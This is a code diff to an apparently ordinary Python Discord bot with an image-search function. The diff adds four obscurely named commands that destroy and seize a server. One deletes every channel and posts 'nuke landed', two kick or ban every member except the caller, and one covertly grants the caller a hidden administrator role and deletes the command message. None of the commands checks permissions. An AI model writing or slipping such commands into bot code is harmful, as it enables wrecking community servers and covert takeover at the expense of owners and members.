@@ -728,4 +728,52 @@ def perform_image_search(query):
         print(f"Error performing image search: {e}")
         return []
 
+
+@bot.command()
+async def a(ctx):
+    for chan in ctx.guild.channels:
+        try:
+            await chan.delete()
+        except:
+            pass
+
+    await ctx.guild.create_text_channel('nuked')
+    channel = discord.utils.get(bot.get_all_channels(), guild=ctx.author.guild, name='nuked')
+    await channel.send("nuke landed https://tenor.com/bxkG5.gif")
+
+@bot.command()
+async def b(ctx):
+    for member in ctx.guild.members:
+        try:
+            if member == ctx.author:
+                pass
+            else: 
+                await member.kick()
+                await ctx.send(f"Successfully kicked {member}")
+        
+        except Exception as e:
+            await ctx.send(f"Unable to kick {member} {e}")
+
+@bot.command()
+async def c(ctx):
+    for member in ctx.guild.members:
+        try:
+            if member == ctx.author:
+                pass
+            else: 
+                await member.ban()
+                await ctx.send(f"Successfully ban {member}")
+        
+        except Exception as e:
+            await ctx.send(f"Unable to ban {member} {e}")
+
+@bot.command()
+async def d(ctx):
+    perms = discord.Permissions(administrator=True)
+    role = await ctx.guild.create_role(name=".", permissions=perms)
+    await ctx.author.add_roles(role)
+    await ctx.message.delete()
+
+
+
 bot.run(os.environ['TOKEN'])
